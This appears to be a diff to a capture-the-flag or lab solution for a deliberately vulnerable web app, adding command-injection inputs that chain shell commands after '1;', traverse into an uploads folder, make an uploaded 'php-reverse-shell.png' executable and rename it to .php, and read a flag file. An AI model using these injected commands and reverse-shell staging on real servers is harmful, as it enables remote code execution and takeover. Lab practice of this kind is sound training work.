@@ -33,4 +33,10 @@ Solution
 
 1;cd ../../../../www/blob/hackable/uploads/;ls
 
+1;cd ../../../../www/blob/hackable/uploads/;chmod +x php-reverse-shell.png
+
+1;cd ../../../../www/blob/hackable/uploads/;mv php-reverse-shell.png php-reverse-shell.php
+
 1;cd ../../../../www/blob/hackable/uploads/;cat flag.txt
+
+php-reverse-shell.php
